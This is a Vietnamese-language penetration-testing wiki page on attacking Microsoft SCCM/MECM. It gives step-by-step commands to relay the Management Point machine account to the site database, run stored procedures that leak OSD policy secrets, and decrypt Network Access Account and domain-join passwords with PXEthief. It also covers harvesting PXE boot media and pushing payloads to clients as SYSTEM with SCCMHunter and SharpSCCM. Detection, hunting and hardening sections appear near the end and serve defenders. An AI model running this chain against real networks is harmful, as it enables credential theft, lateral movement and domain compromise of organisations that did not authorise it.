# SCCM / MECM Abuse: Policy Secrets and Client Execution

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Bằng cách buộc một **System Center Configuration Manager (SCCM) Management Point (MP)** xác thực qua SMB/RPC rồi **relay** tài khoản máy NTLM đó đến **site database (MSSQL)**, bạn có được quyền `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Các role này cho phép bạn gọi một nhóm stored procedure làm lộ các policy blob của **Operating System Deployment (OSD)** (thông tin xác thực Network Access Account, biến Task-Sequence, v.v.). Các blob được mã hóa bằng hex/mã hóa, nhưng có thể giải mã và giải mã hóa bằng **PXEthief**, cho ra các secret dạng plaintext.<sup>[[2]](#references)</sup>

Chuỗi tấn công tổng quan:
1. Tìm MP và site DB ↦ endpoint HTTP không cần xác thực `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Khởi chạy `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Buộc MP xác thực bằng **PetitPotam**, PrinterBug, DFSCoerce, v.v.
4. Thông qua SOCKS proxy, kết nối bằng `mssqlclient.py -windows-auth` với tư cách tài khoản **<DOMAIN>\\<MP-host>$** đã bị relay.
5. Thực thi:
   * `use CM_<SiteCode>`
   * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
   * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (hoặc `MP_GetPolicyBodyAfterAuthorization`)
6. Xóa BOM `0xFFFE`, chạy `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Có thể lấy được các secret như `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, v.v. mà không cần truy cập PXE hay client.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Liệt kê các endpoint MP không cần xác thực
Phần mở rộng ISAPI **GetAuth.dll** của MP cung cấp một số tham số không yêu cầu xác thực (trừ khi site chỉ dùng PKI):<sup>[[1]](#references)</sup>

| Tham số | Mục đích |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Trả về public key của chứng chỉ ký site cùng các GUID của thiết bị *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Liệt kê mọi Management-Point trong site. |
| `SITESIGNCERT` | Trả về chứng chỉ ký Primary-Site (xác định site server mà không cần LDAP). |

Lấy các GUID sẽ được dùng làm **clientID** cho những truy vấn DB sau:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```

---

## 2. Relay tài khoản máy MP đến MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)                              
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
       -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Khi coercion được kích hoạt, bạn sẽ thấy nội dung tương tự như sau:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```

---

## 3. Xác định chính sách OSD thông qua stored procedures
Kết nối thông qua SOCKS proxy (cổng 1080 theo mặc định):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Chuyển sang DB **CM_<SiteCode>** (dùng mã site gồm 3 chữ số, ví dụ: `CM_001`).

### 3.1  Tìm GUID của máy tính chưa xác định (tùy chọn)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```

### 3.2 Liệt kê các chính sách được chỉ định
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Mỗi hàng chứa `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Tập trung vào các policy:
* **NAAConfig** – thông tin xác thực Network Access Account
* **TS_Sequence** – các biến Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Có thể chứa các tài khoản run-as

### 3.3  Truy xuất toàn bộ nội dung
Nếu đã có `PolicyID` và `PolicyVersion`, bạn có thể bỏ qua yêu cầu về clientID bằng cách dùng:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> QUAN TRỌNG: Trong SSMS, hãy tăng “Maximum Characters Retrieved” (>65535), nếu không blob sẽ bị cắt bớt.

---

## 4. Giải mã và giải mã hóa blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Ví dụ về các bí mật đã khôi phục:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```

---

## 5. Các SQL role & procedure liên quan
Sau khi relay, login được ánh xạ tới:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Các role này có hàng chục quyền EXEC; những quyền chính được dùng trong cuộc tấn công này là:

| Stored Procedure | Mục đích |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Liệt kê các policy được áp dụng cho `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Trả về toàn bộ nội dung policy. |
| `MP_GetListOfMPsInSiteOSD` | Được trả về qua đường dẫn `MPKEYINFORMATIONMEDIA`. |

Bạn có thể kiểm tra danh sách đầy đủ bằng cách:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
  AND  pe.permission_name='EXECUTE';
```

---

## 6. Thu thập boot media PXE (SharpPXE)
* **PXE reply qua UDP/4011**: gửi yêu cầu boot PXE đến Distribution Point được cấu hình cho PXE. Phản hồi proxyDHCP tiết lộ các đường dẫn boot như `SMSBoot\\x64\\pxe\\variables.dat` (cấu hình được mã hóa) và `SMSBoot\\x64\\pxe\\boot.bcd`, cùng một blob khóa được mã hóa tùy chọn.<sup>[[4]](#references)</sup>
* **Lấy boot artifacts qua TFTP**: dùng các đường dẫn được trả về để tải `variables.dat` qua TFTP (không cần xác thực). Tệp này nhỏ (vài KB) và chứa các biến media được mã hóa.
* **Giải mã hoặc crack**:
  - Nếu phản hồi có khóa giải mã, đưa khóa đó cho **SharpPXE** để giải mã trực tiếp `variables.dat`.
  - Nếu không có khóa (media PXE được bảo vệ bằng mật khẩu tùy chỉnh), SharpPXE xuất ra hash `$sccm$aes128$...` **tương thích với Hashcat** để crack offline. Sau khi khôi phục mật khẩu, giải mã tệp.
* **Phân tích XML đã giải mã**: các biến dạng plaintext chứa metadata triển khai SCCM (**URL Management Point**, **Site Code**, GUID của media và các định danh khác). SharpPXE phân tích chúng và in ra một lệnh **SharpSCCM** có thể chạy ngay, với các tham số GUID/PFX/site được điền sẵn để tiếp tục khai thác.
* **Yêu cầu**: chỉ cần kết nối mạng đến PXE listener (UDP/4011) và TFTP; không cần quyền local admin.

---

## 7. Thực thi SCCM client để lateral movement

Đây là **lạm dụng quyền triển khai hợp lệ**, không phải lỗ hổng SCCM không cần xác thực: operator phải có sẵn một role có thể triển khai ứng dụng hoặc tạo/phê duyệt client script (hoặc kiểm soát một component/account có các quyền đó). Việc thực thi có thể chạy với quyền của người dùng đang đăng nhập hoặc dưới dạng `SYSTEM`, khiến một SCCM control plane bị compromise trở thành công cụ lateral movement có tác động lớn.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

### Client script với SCCMHunter

Sau khi kết nối đến site server bằng [SCCMHunter](https://github.com/garrettfoster13/sccmhunter), xác định SCCM resource ID của mục tiêu, chuyển sang context của mục tiêu và gửi một PowerShell script. Công cụ có thể tạo, phê duyệt, thực thi, lấy kết quả và xóa SCCM script tạm thời; các site không cho phép tác giả tự phê duyệt script của mình yêu cầu thông tin xác thực phê duyệt riêng.<sup>[[6]](#references)[[7]](#references)</sup>

```bash
python3 sccmhunter.py admin -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ip <SITE_SERVER>
() C:\ >> get_device <TARGET>
() (C:\) >> interact <RESOURCE_ID>
(<RESOURCE_ID>) (C:\) >> script /path/to/payload.ps1
```

Chuỗi tiến trình phía máy khách thường là `CcmExec.exe -> PowerShell.exe`. Nếu script ghi dữ liệu thông qua `$env:USERPROFILE` và kết quả nằm trong `C:\Windows\System32\config\systemprofile`, thì ngữ cảnh thực thi được chọn là `SYSTEM`.<sup>[[7]](#references)</sup>

### Triển khai ứng dụng bằng SharpSCCM

[SharpSCCM](https://github.com/Mayyhem/SharpSCCM) có thể tạo ứng dụng/triển khai tạm thời cho một thiết bị và thực thi lệnh, đường dẫn cục bộ hoặc đường dẫn UNC. `-s` chọn ngữ cảnh `SYSTEM`; nếu không có tùy chọn này, `exec` mặc định sử dụng người dùng đang đăng nhập. Đường dẫn phải có thể được ngữ cảnh/đối tượng đích đã chọn truy cập từ trước.<sup>[[5]](#references)[[7]](#references)</sup>

```powershell
SharpSCCM.exe exec -d <TARGET_DEVICE> -p C:\Temp\payload.exe -s
```

Application execution có chuỗi tiến trình tổ tiên khác với tính năng client-script. `CcmExec.exe` nhận policy và dùng `CITaskMgr.dll` để gửi một yêu cầu WMI cục bộ bất đồng bộ; tiến trình `WmiPrvSE.exe` đang chạy, vốn lưu trữ SCCM provider, sẽ tạo tiến trình. Do đó, detector chỉ theo dõi `CcmExec.exe -> PowerShell.exe` sẽ bỏ sót hoạt động thực thi khi triển khai ứng dụng.<sup>[[7]](#references)[[8]](#references)</sup>

```text
CcmExec.exe
  -> CITaskMgr.dll
  -> root\CCM\CIModels:CCM_AppDeliveryType.EnforceApp
  -> IWbemServices::ExecMethodAsync

WmiPrvSE.exe
  -> AppProvider.dll -> ScriptHandler.dll -> AppExcnLib.dll
  -> ccmcore.dll!CcmCreateProcessEx / CcmCreateProcessAsUserEx
  -> CreateProcessW / CreateProcessAsUserW
  -> deployed process
```

Request mang theo `AppDeliveryTypeId`, `Revision`, `ContentPath`, `ActionType`, `UserSid` và `SessionId`. `AppProvider.dll` đọc các đầu vào này, phân giải deployment synclet và gọi đến `AppExcnLib.dll!CAppExecutionLibrary_RunCmdAsUser`; sau đó, SCCM wrapper trong `ccmcore.dll` tạo process. Điều này giải thích vì sao `WmiPrvSE.exe`, chứ không phải `CcmExec.exe`, được ghi nhận là tiến trình cha của payload.<sup>[[7]](#references)</sup>

> **Gợi ý reverse engineering:** trong một lệnh gọi COM 64-bit được decompile thành `(**(code **)(*services + 0xc8))(services, ...)`, hãy chia byte offset cho kích thước con trỏ: `0xc8 / 8 = 25`. Ánh xạ slot 25 trong `IWbemServices` cho biết đó là `ExecMethodAsync`, hàm này trả về ngay trong khi WMI chuyển tiếp request đến provider.<sup>[[7]](#references)[[8]](#references)</sup>

### Săn tìm việc thực thi ứng dụng và gói

Tương quan **module load với việc tạo process**, thay vì chỉ dựa vào tên tiến trình cha. Khi bật telemetry Sysmon Image Load, hãy tìm các phiên bản `WmiPrvSE.exe` nạp `C:\Windows\CCM\AppProvider.dll`, sau đó nối `ProcessGuid` của process đó với các sự kiện tạo process về sau có `ParentProcessGuid` trùng khớp. Nhóm image con và command line trên các endpoint: payload chỉ xuất hiện trên một vài client đáng được ưu tiên điều tra hơn một deployment launcher phổ biến. Độ hiếm chỉ là một heuristic, không phải bằng chứng — vẫn có các deployment hợp lệ chỉ chạy một lần và đối phương có thể triển khai trên diện rộng.<sup>[[7]](#references)</sup>

Khi thiết lập baseline, cần tính đến các điểm mù sau:<sup>[[7]](#references)</sup>

- Ứng dụng x86 có thể tạo chuỗi `WmiPrvSE.exe -> C:\Windows\CCM\Ccm32BitLauncher.exe -> application` thay vì có application làm tiến trình con trực tiếp.
- Một deployment **package** có thể bỏ qua hoàn toàn `WmiPrvSE.exe`: `CcmExec.exe -> Ccm32BitLauncher.exe -> package payload`.
- Deployment ứng dụng có thể chủ ý khởi chạy PowerShell, tạo ra chuỗi `WmiPrvSE.exe -> PowerShell.exe`; PowerShell Script Block Logging (event ID `4104`) vẫn hữu ích để khôi phục nội dung script.

Trên client, thu thập `C:\Windows\CCM\Logs\AppEnforce.log` để xem chi tiết việc thực thi cài đặt/gỡ cài đặt ứng dụng. `execmgr.log` ghi lại package và task sequence, vì vậy hãy thu thập cả hai khi săn tìm trên các luồng deployment ứng dụng và package.<sup>[[9]](#references)</sup>

---

## 8. Phát hiện & Tăng cường bảo mật
1. **Giám sát MP login** – bất kỳ lần đăng nhập nào của computer account MP từ IP không phải host của nó ≈ relay.<sup>[[1]](#references)</sup>
2. Bật **Extended Protection for Authentication (EPA)** trên site database (`PREVENT-14`).
3. Tắt NTLM không sử dụng, bắt buộc SMB signing, hạn chế RPC (
   dùng các biện pháp giảm thiểu tương tự như khi đối phó với `PetitPotam`/`PrinterBug`).
4. Tăng cường bảo mật kết nối MP ↔ DB bằng IPSec / mutual-TLS.
5. **Hạn chế phạm vi PXE** – firewall UDP/4011 và TFTP trong các VLAN đáng tin cậy, yêu cầu mật khẩu PXE và cảnh báo khi tải TFTP các tệp `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Xem thêm
* Kiến thức cơ bản về NTLM relay:
  
{{#ref}}
  ../ntlm/README.md
  {{#endref}}

* Lạm dụng MSSQL & hậu khai thác:
  
{{#ref}}
  abusing-ad-mssql.md
  {{#endref}}

## References
- [1] [Tôi muốn nói chuyện với quản lý của bạn: Đánh cắp bí mật bằng Management Point Relay](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)
- [5] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
- [6] [SCCMHunter](https://github.com/garrettfoster13/sccmhunter)
- [7] [Làm rõ cách thực thi ứng dụng SCCM](https://specterops.io/blog/2026/09/10/unmasking-sccm-application-execution/)
- [8] [Phương thức IWbemServices::ExecMethodAsync](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemservices-execmethodasync)
- [9] [Tham khảo tệp log - Configuration Manager](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)
{{#include ../../banners/hacktricks-training.md}}
